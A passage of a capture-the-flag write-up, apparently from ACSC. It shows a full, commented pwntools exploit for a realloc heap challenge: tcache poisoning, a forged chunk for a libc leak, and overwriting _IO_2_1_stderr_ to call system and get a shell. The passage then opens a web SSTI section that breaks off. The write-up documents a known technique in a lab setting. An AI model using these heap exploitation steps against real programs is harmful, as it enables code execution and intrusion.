</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Size: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Memo: &#39;</span><span class="p">,</span> <span class="n">memo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">list</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">MENU&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exit_program</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create Tcache overlapping chunks</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># tcache[0x80] = chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># tcache[0x80] = chunks[1] -&gt; chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># This realloc will use the latest chunk in tcache[0x80]. Now, chunks[2] and chunks[1] overlap.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># tcache[0x80] = chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># chunks[2] == chunks[1]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Free chunks[1]. Now, chunks[2] contains mangled heap pointer</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get the leak via list() feature</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_link</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[2] &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_heap</span> <span class="o">=</span> <span class="n">demangle</span><span class="p">(</span><span class="n">leaked_link</span><span class="p">)</span> <span class="c1"># Leaked heap == chunks[0] heap address</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;leaked heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_heap</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, our target is to create a fake chunk with size 0x420, free it, and then peek its content</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># First, poison the tcache list so that the realloc will allocate a chunk to our fake chunk.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We will place the fake chunk inside the chunks[0]+0x10, so that the fake chunk metadata will be placed in chunks[0]+0x0,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># which mean we can edit the fake chunk metadata later after it got allocated by calling edit on chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">target_addr</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">+</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">target_addr</span><span class="p">,</span> <span class="n">target_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Poison tcache list.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Notes that this realloc will do nothing as chunks[1] size metadata is still the same (0x80), </span>
</span></span><span class="line"><span class="cl"><span class="c1"># which is why the tcache[0x80] won&#39;t be consumed.</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Will used the tcache entry, which is the same address as chunk[1]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Now, chunks[4] = chunks[0]+0x10</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Second, create an overlap chunk with chunks[4].</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We want to overlap chunks[4] and chunks[5].</span>
</span></span><span class="line"><span class="cl"><span class="c1"># But first, fix the metadata of the fake chunk first, so that the size will be set to 0x81</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># Fix the metadata of the fake chunk by editing the chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># Now, we can free the chunks[4]. After the free, tcache[0x80] = chunks[4]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Allocate a new chunks[5], and it will use the latest chunk in tcache[0x80], which is chunks[4].</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># Now, chunks[5] == chunks[4]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Third, forge the metadata to 0x421</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x421</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># Overwrite the metadata of the fake chunk</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, before we free the fake chunk, we need to create two more valid fake chunks after fake_chunk+0x420</span>
</span></span><span class="line"><span class="cl"><span class="c1"># to fulfill the security check implemented in glibc.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># But we don&#39;t have yet chunk which reside on that area (fake_chunk+0x420).</span>
</span></span><span class="line"><span class="cl"><span class="c1"># </span>
</span></span><span class="line"><span class="cl"><span class="c1"># So we need to call multiple realloc on the same chunks first to grow our heap, so that one of our controlled chunk.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># is placed around that area.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Remember that if we call realloc with the same size, it will do nothing. So, to grow our heap, the trick is</span>
</span></span><span class="line"><span class="cl"><span class="c1"># we will realloc the target chunk to smaller size first, and then realloc it back again to the desired size.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># </span>
</span></span><span class="line"><span class="cl"><span class="c1"># Also, remember that from our experiments, reallocing existing chunk to larger size won&#39;t use any cache</span>
</span></span><span class="line"><span class="cl"><span class="c1"># So, by doing this, we are guaranteed to grow our heap (none of our tcache chunks will be used).</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Now, Observing the gdb, top chunk is placed in fake_chunk+0xf0.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># So, to be able forge two more fake chunks on fake_chunk+0x420, we will need to allocate more.</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># The above loop will make the top chunk is placed in fake_chunk+0x3f0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Resize it to smaller chunk first before doing the last allocation.</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, the below allocation will make the top chunk is placed in fake_chunk+0x470, which is enough</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Specifically, the allocated chunk will be placed in fake_chunk+0x400, and because the chunk size is 0x70, we will</span>
</span></span><span class="line"><span class="cl"><span class="c1"># be able to forge two more fake chunk in area fake_chunk+0x420.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># </span>
</span></span><span class="line"><span class="cl"><span class="c1"># So, our two fake chunks will be placed starting from this_chunk+0x20</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span> <span class="c1"># 0x20 padding</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="c1"># second fake chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="c1"># third fake chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Now, our fake_chunk next chunks will be a valid chunk. We will be able to call free(chunks[4])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Free it to unsorted bin. Remember that chunks[4] == chunks[5]. </span>
</span></span><span class="line"><span class="cl"><span class="c1"># So, if you call list(), chunks[5] content will be a libc address to main_arena+96.</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get Libc leak</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[5] &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;leaked libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main_arena&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">96</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, our target is to hijack the _IO_2_1_stderr_, so that during exit and flushing the available FILE,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># we will get a shell.</span>
</span></span><span class="line"><span class="cl"><span class="n">stderr_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stderr_&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># We only need to forge the wide_vtable+0x68 entry,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># and we will place the fake_wide_vtable on chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_vtable_addr</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">-</span><span class="mh">0x68</span> <span class="c1"># By setting this, fake_wide_vtable+0x68 entry will point to chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We will setup this fake wide vtable contents later after we setup the _IO_2_1_stderr_</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># We only need to forge the wide_data.vtable (which offset is wide_data+0xe0),</span>
</span></span><span class="line"><span class="cl"><span class="c1"># and we will place the fake_wide_data on chunks[1].</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Observing in gdb, chunks[1] = chunks[0] + 0x400</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_data_addr</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">+</span><span class="mh">0x400</span><span class="o">-</span><span class="mh">0xe0</span> <span class="c1"># By setting this, fake_wide_data.vtable will point to chunks[1]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We will setup this fake wide data contents later after we setup the _IO_2_1_stderr_</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup a fake stderr FILE structure</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We will split the whole fake stderr to two chunks</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span>                <span class="o">=</span> <span class="n">FileStructure</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">flags</span>          <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;  sh</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_IO_write_ptr</span>  <span class="o">=</span> <span class="mi">1</span> <span class="c1"># _IO_write_ptr &gt; _IO_write_base</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_wide_data</span>     <span class="o">=</span> <span class="n">fake_wide_data_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">vtable</span>         <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fake_stderr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># We want to allocate a chunk to _IO_2_1_stderr_+0x0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># First, fix the chunks[1] size metadata from 0x420 back to 0x80</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># After this edit, we will be able to free the chunks[1]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># After this, tcache[0x80] = chunks[4] -&gt; chunks[1]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Remember that chunks[4] = chunks[0]+0x10. So, we&#39;re able to edit chunks[4] tcache pointer via chunks[0].</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Why don&#39;t we directly edit it via chunks[4]? Well we actually can, but in this case, the realloc will throw</span>
</span></span><span class="line"><span class="cl"><span class="c1"># error next size, because the chunks[4] size is no 0x80, and we haven&#39;t properly setup fake chunks in area chunks[4]+0x80</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">target_addr</span><span class="p">,</span> <span class="n">stderr_addr</span><span class="p">))</span> <span class="c1"># Don&#39;t forget to mangle it, because tcache pointer expecting a mangled address.</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span> <span class="c1"># After this, next allocation will be placed in _IO_2_1_stderr_+0x0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Put the first half of our fake_stderr bytes on this allocation, because chunks[7] will be</span>
</span></span><span class="line"><span class="cl"><span class="c1"># allocated in _IO_2_1_stderr_+0x0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fake_stderr_bytes</span><span class="p">[:</span><span class="mh">0x6f</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, repeat the previous step so that we can allocate a chunk to _IO_2_1_stderr_+0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># Now tcache[0x80] = chunks[0] -&gt; chunks[4]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Poison tcache pointer to point to _IO_2_1_stderr_+0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">target_addr</span><span class="p">,</span> <span class="n">stderr_addr</span><span class="o">+</span><span class="mh">0x70</span><span class="p">)))</span> <span class="c1"># Don&#39;t forget to mangle it</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span> <span class="c1"># After this, next allocation will be placed in _IO_2_1_stderr_+0x70</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Put the second half of our fake_stderr bytes on this allocation, because chunks[9] will be</span>
</span></span><span class="line"><span class="cl"><span class="c1"># allocated in _IO_2_1_stderr_+0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fake_stderr_bytes</span><span class="p">[</span><span class="mh">0x70</span><span class="p">:</span><span class="mh">0x70</span><span class="o">+</span><span class="mh">0x6f</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Now that we have successfully forge _IO_2_1_stderr_, time to finish it</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup fake_wide_vtable entry to system</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup fake_wide_data.vtable to point to our fake wide vtable</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_wide_vtable_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Exit from the binary, and we will get a shell!</span>
</span></span><span class="line"><span class="cl"><span class="n">exit_program</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Flag: ACSC{r34ll0c_15_n07_ju57_r34ll0c473}</strong></p>
</blockquote>
<h1 id="web">Web</h1>
<h2 id="easyssti-200-pts">easySSTI (200 pts)</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Can you SSTI me?</div>
        </div>
    </div>
<h3 id="initial-analysis-1">Initial Analysis</h3>
<p>On this challenge, we were given a WAF file called <code>index.js</code> and a <code>go</code> file called <code>main.go</code> as the main server. Let&rsquo;s check the WAF file first</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
